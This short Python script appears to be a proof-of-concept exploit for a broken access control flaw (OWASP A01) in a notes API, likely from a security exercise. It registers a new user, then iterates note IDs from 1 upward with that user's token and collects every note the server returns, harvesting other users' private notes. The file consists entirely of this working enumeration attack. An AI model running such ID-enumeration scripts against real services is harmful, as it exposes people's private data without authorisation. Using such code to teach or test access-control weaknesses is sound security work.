# VULNERABILITY 1: No chekck if the note belongs to the user
# LINK: https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/

from helper import API_BASE_URL, create_new_user_and_get_token
import requests


def main():
    token = create_new_user_and_get_token()
    headers = {"Authorization": f"Bearer {token}"}
    notes = []
    i = 1
    while True:
        res = requests.get(f"{API_BASE_URL}/notes/{i}", headers=headers)
        if res.status_code != 200:
            return notes
        notes.append(res.json())
        i += 1


if __name__ == "__main__":
    import pprint

    pprint.pprint(main())
